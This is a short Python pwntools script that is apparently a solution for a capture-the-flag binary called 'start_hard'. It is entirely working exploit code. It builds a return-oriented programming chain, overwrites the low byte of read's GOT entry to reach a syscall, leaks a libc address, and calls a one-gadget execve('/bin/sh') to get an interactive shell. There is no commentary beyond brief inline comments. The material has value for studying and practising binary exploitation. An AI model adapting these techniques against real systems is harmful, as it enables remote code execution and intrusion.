from pwn import *
libc = ELF("/usr/lib/libc.so.6", checksec=False)
elf = ELF("./start_hard_c8b452f5aab9a474dcfe1351ec077a601fdf8249", checksec=False)
pop_rsi_r15 = p64(0x00000000004005c1)
pop_rdi = p64(0x00000000004005c3)
mov_eax_0 = p64(0x40054b)
bss = 0x000000000601038 + 0x100
payload = b''.join([
    cyclic(16), p64(bss-0x8), # setup fake stack frame

    pop_rsi_r15, p64(bss), p64(0), # insert fake instruction to bss
    p64(elf.plt['read']),

    pop_rsi_r15, p64(elf.got['read']), p64(0), # overwrite last byte read to point syscall
    p64(elf.plt['read']),

    pop_rdi, p64(1),
    p64(elf.plt['read']),   # write -> leak

    mov_eax_0, # set eax to 0 and return to bss
])
p = elf.process()
pause()
p.sendline(payload)
payload = b''.join([
    pop_rdi, p64(0),
    pop_rsi_r15, p64(bss+(8*6)), p64(0), # overwrite rip from bss
    p64(elf.plt['read']),
])
p.send(payload) # send to bss
p.send(b'\xc0') # read -> syscall
leak = u64(p.recv(8))
libc.address = leak - (libc.sym['read']+0x10)
log.info("leak at 0x%x" % leak)
log.info("libc base at 0x%x" % libc.address)
# 0xcd530 execve("/bin/sh", rsi, rdx)
payload = b''.join([
    p64(0x00000000004003e1),
    p64(libc.address + 0x00000000000b686a), p64(0), # rdx
    p64(libc.address + 0x0000000000039b2e), p64(0), # rsi
    p64(libc.address + 0xcd530)
])
p.clean()
p.send(payload) # get shell
p.interactive()